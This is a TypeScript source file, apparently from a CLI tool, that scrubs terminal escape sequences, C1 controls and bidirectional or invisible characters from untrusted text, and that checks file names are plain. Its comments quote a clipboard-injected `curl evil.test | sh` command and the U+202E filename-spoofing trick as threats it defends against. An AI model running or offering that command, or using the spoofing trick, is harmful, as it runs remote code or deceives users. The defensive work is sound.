/**
 * Somebody else's words, made safe to print on the terminal of the person running this command.
 *
 * A TERMINAL OBEYS WHAT IT IS HANDED. A row a member appended, a note an automation step kept, a pack's name, a
 * catalogue's title: each is written by somebody other than the person reading the line, and printed as kept, an ESC or
 * a BEL in it is an instruction. Testing measured `automations show` passing a `set_var` answer
 * through with OSC 52 (put `curl evil.test | sh` on the clipboard), OSC 0 (retitle the window) and CR plus CSI 2K (erase
 * the line it came on) intact. `brief.ts` and `session.ts` each kept a private copy of the first half of this, which
 * stopped at U+001F. Both now import `clip` from it, and `clip-everywhere.test.ts` holds them to it.
 *
 * C1 AS WELL AS C0. U+009B and U+009D are the eight-bit spellings of CSI and OSC. Whether a terminal acts on them in
 * UTF-8 depends on the terminal, exactly as it does for the seven-bit ones, so the scrub does not bet on which
 * terminal the owner has. DEL goes with them.
 *
 * FORMAT CHARACTERS ARE TAKEN OUT, NOT SPACED. Testing measured every bidirectional control
 * (U+061C, U+200E, U+200F, U+202A to U+202E, U+2066 to U+2069) and every invisible one it tried (U+200B, U+2060, U+00AD,
 * U+FFF9 to U+FFFB, the tag characters) reaching the line. None is an instruction to a terminal, but in one that lays
 * text out both ways U+202E makes `invoice U+202E fdp.exe` read as `invoiceexe.pdf`. They are removed rather than turned
 * into a space because each sits inside a word when it is honest: a soft hyphen a web page put inside `cooperative`
 * should print `cooperative`, not `co operative`. U+200D stays, because a family or a rainbow flag is drawn from it,
 * and so does U+200C, which Persian spells words with.
 *
 * NEVER FOR `--json`. An agent is handed the record's value as the record sent it, and `JSON.stringify` escapes C0 on
 * the way out; scrubbing there would change data somebody may be branching on.
 */

/**
 * Bidirectional controls and invisible characters: nothing a person can see, and some that reorder what they can.
 *
 * SPELLED AS ESCAPES. The first version of this line held the characters themselves, which made it the one source file
 * in the tree carrying U+202A to U+202E and U+2066 to U+2069: invisible in an editor, reordering the line in a diff, and
 * readable only through `od`. The escaped class was checked to match exactly the same code points as that one, all of
 * U+0000 to U+10FFFF.
 */
const FORMAT = /[\u00ad\u061c\u200b\u200e\u200f\u202a-\u202e\u2060\u2066-\u2069\ufff9-\ufffb\u{e0000}-\u{e007f}]/gu;

/**
 * Whether a name another machine chose is a file name in one folder and nothing more: no folder in it, by either slash,
 * no drive or stream by a colon, no control character, and not a dot file, so it cannot climb out or land on a `.bashrc`.
 */
export const plainFileName = (name: string): boolean => name !== '' && name.length <= 255 && !/^\.|[\\/:\x00-\x1f\x7f]/u.test(name);

/**
 * A sentence for the terminal, its line breaks and indent kept: what `oneLine` takes out of a line, without joining
 * lines. For what reaches standard error whatever wrote it, such as a host's refusal said whole.
 */
export const forTerminal = (said: string): string => said.replace(FORMAT, '').replace(/[\x00-\x08\x0b-\x1f\x7f-\x9f]/gu, '');

/** One line of somebody else's words: format characters gone, every control character and run of space one space, trimmed. */
export const oneLine = (said: string): string =>
  said
    .replace(FORMAT, '')
    .replace(/[\x00-\x1f\x7f-\x9f\s]+/g, ' ')
    .trim();

/**
 * One line of somebody else's words, cut to `max` characters with `...` when it is longer.
 *
 * COUNTED IN CODE POINTS, NOT UTF-16 UNITS. `slice` on the string cut an emoji at the boundary in half, and a probe
 * printed `clip cuts a surrogate pair: true` with its high half left on the line.
 */
export const clip = (said: string, max: number): string => {
  const one = [...oneLine(said)];
  return one.length > max ? `${one.slice(0, max - 3).join('')}...` : one.join('');
};

/**
 * A copy of a record's answer with every string in it made `oneLine`, for building printed lines from.
 *
 * THE WHOLE VALUE, NOT FIELD BY FIELD. `automations show` prints eleven strings the record supplies and `scripts list`
 * fourteen, from a step's answer down to a date the record could send in any shape; testing named nine of
 * them. Scrubbing the answer once, before any line is built, means a field a later line starts printing is already
 * clean, and nobody has to remember that it came from somebody else.
 *
 * KEYS AS WELL AS VALUES. A probe printed `printable object key kept ESC: true`. No line prints a
 * key today, but one can reach here from real data: `automations show` hands over a rule's `body`, and a `script`
 * step's `input` is a map whose names `flow-lint.ts` does not look at (it asks only that each value is text). A key is
 * words too, for the same reason as the paragraph above.
 */
export function printable<T>(value: T): T {
  if (typeof value === 'string') return oneLine(value) as T;
  if (Array.isArray(value)) return value.map((v: unknown) => printable(v)) as T;
  if (value !== null && typeof value === 'object') return Object.fromEntries(Object.entries(value).map(([k, v]) => [oneLine(k), printable(v)])) as T;
  return value;
}
